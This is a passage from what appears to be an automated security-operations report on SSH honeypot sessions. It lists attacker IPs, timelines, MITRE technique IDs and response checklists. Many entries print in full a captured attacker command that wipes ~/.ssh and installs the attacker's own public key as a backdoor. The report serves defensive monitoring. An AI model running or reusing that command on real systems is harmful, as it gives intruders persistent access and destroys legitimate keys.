- [ ] Submit `160.251.169[.]213` to AbuseIPDB if not already reported
- [ ] Block `160.251.169[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d34507b7d76

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:05 |
| **Last Seen** | 2026-05-19 07:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:05:28` | `cowrie.session.connect` |
| `2026-05-19 07:05:28` | `cowrie.client.version` |
| `2026-05-19 07:05:28` | `cowrie.client.kex` |
| `2026-05-19 07:05:29` | `cowrie.login.success` |
| `2026-05-19 07:05:29` | `cowrie.session.params` |
| `2026-05-19 07:05:29` | `cowrie.command.input` |
| `2026-05-19 07:05:29` | `cowrie.command.failed` |
| `2026-05-19 07:05:29` | `cowrie.log.closed` |
| `2026-05-19 07:05:29` | `cowrie.session.params` |
| `2026-05-19 07:05:29` | `cowrie.command.input` |
| `2026-05-19 07:05:29` | `cowrie.session.file_download` |
| `2026-05-19 07:05:29` | `cowrie.log.closed` |
| `2026-05-19 07:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beae2ed92e10

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:05 |
| **Last Seen** | 2026-05-19 07:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:05:30` | `cowrie.session.connect` |
| `2026-05-19 07:05:30` | `cowrie.client.version` |
| `2026-05-19 07:05:30` | `cowrie.client.kex` |
| `2026-05-19 07:05:30` | `cowrie.login.success` |
| `2026-05-19 07:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68287bb0c182

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:06 |
| **Last Seen** | 2026-05-19 07:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:06:57` | `cowrie.session.connect` |
| `2026-05-19 07:06:57` | `cowrie.client.version` |
| `2026-05-19 07:06:58` | `cowrie.client.kex` |
| `2026-05-19 07:06:58` | `cowrie.login.success` |
| `2026-05-19 07:06:58` | `cowrie.session.params` |
| `2026-05-19 07:06:58` | `cowrie.command.input` |
| `2026-05-19 07:06:58` | `cowrie.command.failed` |
| `2026-05-19 07:06:58` | `cowrie.log.closed` |
| `2026-05-19 07:06:58` | `cowrie.session.params` |
| `2026-05-19 07:06:58` | `cowrie.command.input` |
| `2026-05-19 07:06:58` | `cowrie.session.file_download` |
| `2026-05-19 07:06:58` | `cowrie.log.closed` |
| `2026-05-19 07:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49bbd57ac244

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:06 |
| **Last Seen** | 2026-05-19 07:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:06:59` | `cowrie.session.connect` |
| `2026-05-19 07:06:59` | `cowrie.client.version` |
| `2026-05-19 07:06:59` | `cowrie.client.kex` |
| `2026-05-19 07:07:00` | `cowrie.login.success` |
| `2026-05-19 07:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2167465b8778

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:10 |
| **Last Seen** | 2026-05-19 07:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:10:07` | `cowrie.session.connect` |
| `2026-05-19 07:10:07` | `cowrie.client.version` |
| `2026-05-19 07:10:07` | `cowrie.client.kex` |
| `2026-05-19 07:10:07` | `cowrie.login.success` |
| `2026-05-19 07:10:07` | `cowrie.session.params` |
| `2026-05-19 07:10:07` | `cowrie.command.input` |
| `2026-05-19 07:10:07` | `cowrie.command.failed` |
| `2026-05-19 07:10:07` | `cowrie.log.closed` |
| `2026-05-19 07:10:07` | `cowrie.session.params` |
| `2026-05-19 07:10:07` | `cowrie.command.input` |
| `2026-05-19 07:10:08` | `cowrie.session.file_download` |
| `2026-05-19 07:10:08` | `cowrie.log.closed` |
| `2026-05-19 07:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89938466723c

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:10 |
| **Last Seen** | 2026-05-19 07:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:10:09` | `cowrie.session.connect` |
| `2026-05-19 07:10:09` | `cowrie.client.version` |
| `2026-05-19 07:10:09` | `cowrie.client.kex` |
| `2026-05-19 07:10:09` | `cowrie.login.success` |
| `2026-05-19 07:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e41e2d16ec8

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:13 |
| **Last Seen** | 2026-05-19 07:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:13:02` | `cowrie.session.connect` |
| `2026-05-19 07:13:02` | `cowrie.client.version` |
| `2026-05-19 07:13:02` | `cowrie.client.kex` |
| `2026-05-19 07:13:02` | `cowrie.login.success` |
| `2026-05-19 07:13:02` | `cowrie.session.params` |
| `2026-05-19 07:13:02` | `cowrie.command.input` |
| `2026-05-19 07:13:02` | `cowrie.command.failed` |
| `2026-05-19 07:13:03` | `cowrie.log.closed` |
| `2026-05-19 07:13:03` | `cowrie.session.params` |
| `2026-05-19 07:13:03` | `cowrie.command.input` |
| `2026-05-19 07:13:03` | `cowrie.session.file_download` |
| `2026-05-19 07:13:03` | `cowrie.log.closed` |
| `2026-05-19 07:13:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca834616010e

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:13 |
| **Last Seen** | 2026-05-19 07:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:13:04` | `cowrie.session.connect` |
| `2026-05-19 07:13:04` | `cowrie.client.version` |
| `2026-05-19 07:13:04` | `cowrie.client.kex` |
| `2026-05-19 07:13:04` | `cowrie.login.success` |
| `2026-05-19 07:13:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-179a4274e55c

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:15 |
| **Last Seen** | 2026-05-19 07:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:15:55` | `cowrie.session.connect` |
| `2026-05-19 07:15:55` | `cowrie.client.version` |
| `2026-05-19 07:15:55` | `cowrie.client.kex` |
| `2026-05-19 07:15:55` | `cowrie.login.success` |
| `2026-05-19 07:15:55` | `cowrie.session.params` |
| `2026-05-19 07:15:55` | `cowrie.command.input` |
| `2026-05-19 07:15:55` | `cowrie.command.failed` |
| `2026-05-19 07:15:55` | `cowrie.log.closed` |
| `2026-05-19 07:15:55` | `cowrie.session.params` |
| `2026-05-19 07:15:55` | `cowrie.command.input` |
| `2026-05-19 07:15:55` | `cowrie.session.file_download` |
| `2026-05-19 07:15:55` | `cowrie.log.closed` |
| `2026-05-19 07:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97b286401104

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:15 |
| **Last Seen** | 2026-05-19 07:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:15:56` | `cowrie.session.connect` |
| `2026-05-19 07:15:56` | `cowrie.client.version` |
| `2026-05-19 07:15:56` | `cowrie.client.kex` |
| `2026-05-19 07:15:56` | `cowrie.login.success` |
| `2026-05-19 07:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f01b9bc9100

| Field | Detail |
|---|---|
| **Source IP** | `62.133.60[.]87` |
| **First Seen** | 2026-05-19 07:17 |
| **Last Seen** | 2026-05-19 07:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:17:37` | `cowrie.session.connect` |
| `2026-05-19 07:17:37` | `cowrie.client.version` |
| `2026-05-19 07:17:37` | `cowrie.client.kex` |
| `2026-05-19 07:17:38` | `cowrie.login.success` |
| `2026-05-19 07:17:38` | `cowrie.session.params` |
| `2026-05-19 07:17:38` | `cowrie.command.input` |
| `2026-05-19 07:17:38` | `cowrie.command.failed` |
| `2026-05-19 07:17:38` | `cowrie.log.closed` |
| `2026-05-19 07:17:38` | `cowrie.session.params` |
| `2026-05-19 07:17:38` | `cowrie.command.input` |
| `2026-05-19 07:17:38` | `cowrie.session.file_download` |
| `2026-05-19 07:17:38` | `cowrie.log.closed` |
| `2026-05-19 07:17:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.133.60[.]87` to AbuseIPDB if not already reported
- [ ] Block `62.133.60[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cfb2a23d69f

| Field | Detail |
|---|---|
| **Source IP** | `62.133.60[.]87` |
| **First Seen** | 2026-05-19 07:17 |
| **Last Seen** | 2026-05-19 07:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:17:40` | `cowrie.session.connect` |
| `2026-05-19 07:17:40` | `cowrie.client.version` |
| `2026-05-19 07:17:41` | `cowrie.client.kex` |
| `2026-05-19 07:17:41` | `cowrie.login.success` |
| `2026-05-19 07:17:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.133.60[.]87` to AbuseIPDB if not already reported
- [ ] Block `62.133.60[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-098305d00d5d

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:18 |
| **Last Seen** | 2026-05-19 07:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:18:45` | `cowrie.session.connect` |
| `2026-05-19 07:18:45` | `cowrie.client.version` |
| `2026-05-19 07:18:45` | `cowrie.client.kex` |
| `2026-05-19 07:18:45` | `cowrie.login.success` |
| `2026-05-19 07:18:45` | `cowrie.session.params` |
| `2026-05-19 07:18:45` | `cowrie.command.input` |
| `2026-05-19 07:18:45` | `cowrie.command.failed` |
| `2026-05-19 07:18:45` | `cowrie.log.closed` |
| `2026-05-19 07:18:45` | `cowrie.session.params` |
| `2026-05-19 07:18:45` | `cowrie.command.input` |
| `2026-05-19 07:18:45` | `cowrie.session.file_download` |
| `2026-05-19 07:18:45` | `cowrie.log.closed` |
| `2026-05-19 07:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85ca7e339aac

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:18 |
| **Last Seen** | 2026-05-19 07:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:18:47` | `cowrie.session.connect` |
| `2026-05-19 07:18:47` | `cowrie.client.version` |
| `2026-05-19 07:18:47` | `cowrie.client.kex` |
| `2026-05-19 07:18:47` | `cowrie.login.success` |
| `2026-05-19 07:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78ecda451ff5

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:20 |
| **Last Seen** | 2026-05-19 07:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:20:08` | `cowrie.session.connect` |
| `2026-05-19 07:20:08` | `cowrie.client.version` |
| `2026-05-19 07:20:08` | `cowrie.client.kex` |
| `2026-05-19 07:20:08` | `cowrie.login.success` |
| `2026-05-19 07:20:08` | `cowrie.session.params` |
| `2026-05-19 07:20:08` | `cowrie.command.input` |
| `2026-05-19 07:20:08` | `cowrie.command.failed` |
| `2026-05-19 07:20:08` | `cowrie.log.closed` |
| `2026-05-19 07:20:08` | `cowrie.session.params` |
| `2026-05-19 07:20:08` | `cowrie.command.input` |
| `2026-05-19 07:20:08` | `cowrie.session.file_download` |
| `2026-05-19 07:20:08` | `cowrie.log.closed` |
| `2026-05-19 07:20:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be195624213d

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:20 |
| **Last Seen** | 2026-05-19 07:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:20:09` | `cowrie.session.connect` |
| `2026-05-19 07:20:09` | `cowrie.client.version` |
| `2026-05-19 07:20:09` | `cowrie.client.kex` |
| `2026-05-19 07:20:09` | `cowrie.login.success` |
| `2026-05-19 07:20:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.83[.]2` to AbuseIPDB if not already reported
- [ ] Block `115.241.83[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59773a208a24

| Field | Detail |
|---|---|
| **Source IP** | `115.241.83[.]2` |
| **First Seen** | 2026-05-19 07:21 |
| **Last Seen** | 2026-05-19 07:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
